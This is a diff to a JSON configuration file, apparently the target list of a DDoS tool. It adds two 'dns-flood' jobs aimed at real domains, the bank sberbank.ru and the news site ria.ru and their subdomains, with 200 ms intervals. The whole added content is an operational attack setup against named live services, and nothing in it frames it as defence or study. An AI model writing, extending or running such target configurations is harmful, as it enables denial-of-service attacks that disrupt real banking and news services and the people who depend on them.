@@ -98,6 +98,40 @@
       },
       "count": 1,
       "intervalMs": 500
+    },
+    {
+      "type": "dns-flood",
+      "args": {
+        "verbose": false,
+        "iterative": true,
+        "root_domain": "sberbank.ru",
+        "target_domains": [
+          "sberbank.ru",
+          "www.sberbank.ru",
+          "online.sberbank.ru"
+        ]
+      },
+      "count": 1,
+      "intervalMs": 200
+    },
+    {
+      "type": "dns-flood",
+      "args": {
+        "verbose": false,
+        "iterative": true,
+        "root_domain": "ria.ru",
+        "target_domains": [
+          "blog.ria.ru",
+          "eco.ria.ru",
+          "beta.ria.ru",
+          "games.ria.ru",
+          "premier.ria.ru",
+          "m.ria.ru",
+          "video.ria.ru"
+        ]
+      },
+      "count": 1,
+      "intervalMs": 200
     }
   ]
 }
